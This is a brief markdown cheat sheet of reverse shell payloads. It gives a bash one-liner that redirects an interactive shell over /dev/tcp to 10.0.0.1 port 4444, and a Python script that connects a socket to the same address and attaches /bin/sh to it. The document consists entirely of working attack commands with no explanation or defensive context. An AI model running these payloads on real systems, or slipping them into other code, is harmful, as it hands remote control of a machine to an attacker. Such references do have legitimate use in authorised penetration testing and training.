# Reverse Shell Cheatsheet

## Bash
`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`

## Python
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.0.0.1',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
```
